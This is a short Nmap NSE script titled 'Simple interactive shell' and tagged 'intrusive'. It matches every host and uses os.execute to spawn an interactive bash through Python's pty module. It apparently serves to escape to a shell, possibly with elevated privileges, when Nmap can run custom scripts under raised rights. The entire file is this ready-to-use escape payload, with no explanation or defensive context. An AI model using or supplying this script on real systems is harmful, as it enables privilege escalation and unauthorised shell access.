description = "Simple interactive shell"
author = "Manolito"
license = "GPLv3"
categories = {"intrusive"}

hostrule = function(host)
  return true
end

action = function(host, port)
  os.execute("/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
end
